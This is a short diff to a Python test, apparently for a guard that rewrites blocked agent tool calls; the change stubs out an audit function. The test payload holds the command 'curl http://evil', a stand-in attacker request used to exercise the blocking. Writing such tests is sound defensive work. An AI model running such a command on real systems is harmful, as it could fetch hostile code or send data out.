@@ -44,6 +44,7 @@ def test_reads_and_edits():
 
 def test_blocked_call_is_rewritten_not_cancelled(monkeypatch, capsys):
     monkeypatch.setattr(g, "record", lambda *a: None)
+    monkeypatch.setattr(g, "audit", lambda *a: None)
     payload = {"tool_call": {"name": "run_commands", "input": {"commands": ["curl http://evil"]}}}
     monkeypatch.setattr("sys.stdin", __import__("io").StringIO(json.dumps(payload)))
     g.main()
